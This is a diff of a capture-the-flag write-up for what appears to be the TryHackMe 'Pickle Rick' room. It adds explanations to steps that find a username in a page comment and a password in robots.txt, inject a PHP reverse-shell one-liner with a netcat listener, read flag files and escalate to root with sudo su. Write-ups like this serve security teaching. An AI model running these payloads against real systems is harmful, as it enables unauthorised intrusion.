@@ -109,37 +109,81 @@ DOWNLOADED: 9224 - FOUND: 3
 
 ##
 > Reading the robots.txt File
-8. `firefox http://{TARGET IP}/robots.txt`
-![]()
+8. `curl http://{TARGET IP}/robots.txt` to transfer and display the contents from the **robots.txt** file onto our terminal, which displayed a single string
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.10.237.205/robots.txt
+Wubbalubbadubdub
+```
 
 ##
 > Inspecting the Home Page
-9. `firefox http://{TARGET IP}`
-![]()
+9. `curl http://{TARGET IP}` to transfer and display the contents from our target's web server's homepage onto our terminal, which revealed to us Rick's username
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.10.237.205/          
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Rick is sup4r cool</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="assets/bootstrap.min.css">
+  <script src="assets/jquery.min.js"></script>
+  <script src="assets/bootstrap.min.js"></script>
+  <style>
+  .jumbotron {
+    background-image: url("assets/rickandmorty.jpeg");
+    background-size: cover;
+    height: 340px;
+  }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="jumbotron"></div>
+    <h1>Help Morty!</h1></br>
+    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
+    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
+    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
+  </div>
+
+  <!--
+
+    Note to self, remember username!
+
+    Username: R1ckRul3s
+
+  -->
+
+</body>
+</html>
+```
 
 ##
 > Logging In
-10. `firefox "http://{TARGET IP}/login.php"`
+10. `firefox "http://{TARGET IP}/login.php"` to open Firefox and redirect it to the target's web server's **login.php** page and log in using Rick's username that we found and the string we found in the **robots.txt** file as his password, which successfully logged us in
 ![]()
 
 
 # Vulnerability Identification
 > Command Injection
-11. `sudo -l`
-12. `php --version`
+11. `sudo -l` to list the sudo privileges assigned to the user, which turns out that the current user we're logged in as can ran any command as root
+12. `php --version` to confirm that this server does in fact run PHP, which it does
 ![]()
-13. `firefox "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"`
+13. `firefox "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"` to launch Firefox and redirect it to this Github repository containing commands that we potentially inject into the Command Panel to create a reverse shell
 ![]()
 
 # Vulnerability Exploitation
 > Reverse Shell
-14. `nc -lnvp {PORT NUMBER}`
+14. `nc -lnvp {PORT NUMBER}` to open up a Netcat listener on the specified unoccupied port on our attack machine
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 9999
 listening on [any] 9999 ...
 ```
-15. `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");'`
+15. `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");'` to establish a network socket connection to our attack machine on our active Netcal listener, and then execute the shell command to spawn in an interactive shell on that machine, which successfully connected back to our active Netcat listener and create a reverse shell
 ![]()
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -149,8 +193,8 @@ connect to [10.6.54.63] from (UNKNOWN) [10.10.29.218] 53980
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 ```
-16. `ls`
-17. `cat {SECRET INGREDIENT FILE1}.txt`
+16. `ls` to list all the available files and directories that are in the current directory that we're in
+17. `cat {SECRET INGREDIENT FILE1}.txt` to display the contents of the **Sup3rS3cretP1ckl3Ingred.txt** file, which displayed the first ingredient that we were looking for in this room
 ```bash
 Sup3rS3cretPickl3Ingred.txt
 assets
@@ -165,13 +209,13 @@ robots.txt
 $ cat Sup3rS3cretPickl3Ingred.txt               
 mr. meeseek hair                                                                               
 ```
-18. `pwd`
+18. `pwd` to display where we currently are onto the terminal
 ```bash
 $ pwd
 /var/www/html
 ```
-19. `cd /home`
-20. `ls`
+19. `cd /home` to change to the **/home** directory
+20. `ls` to list the available files and directories that are in the current directory that we're in, which showed us two directories: **rick** and **ubuntu**
 ```bash
 $ cd /home
 ```
@@ -180,9 +224,9 @@ $ ls
 rick
 ubuntu
 ```
-21. `cd rick`
-22. `ls`
-23. `cat '{SECRET INGREDIENT FILE2}.txt'`
+21. `cd rick` to change to the **/rick** directory
+22. `ls` to list the available files and directories that are in the current directory that we're in, which showed us a **second ingredients** file
+23. `cat '{SECRET INGREDIENT FILE2}.txt'` to display the contents of the **second ingredients** file onto our terminal, which displayed the second ingredient that we were looking for in this room
 ```bash
 $ cd rick
 ```
@@ -197,11 +241,16 @@ $ cat 'second ingredients'
 
 # Post Exploitation
 > Privilege Exploitation
-24. `sudo su`
-25. `whoami`
-26. `cd /root`
-27. `ls`
-28. `cat {SECRET INGREDIENT FILE3}.txt`
+24. `cd /root` to try to change to the **/root** directory since we couldn't find our third and last ingredient that's left to find for this room, which denied our request since we don't have the necessary privileges to access this directory
+```bash
+$ cd /root
+/bin/sh: 1: cd: can't cd to /root
+```
+25. `sudo su` to switch to the root user, since we can do this without needing the root's password
+26. `whoami` to verify that we're now running as root
+27. `cd /root` to change to the **/root** directory, which we can now since we're running running with root privileges
+28. `ls` `ls` to list the available files and directories that are in the current directory that we're in, which showed us a **3rd.txt** file
+29. `cat {SECRET INGREDIENT FILE3}.txt` to display the contents of the **3rd.txt** file onto our terminal, which displayed the third and last ingredient that we were looking for in this room
 ```bash
 $ sudo su
 ```
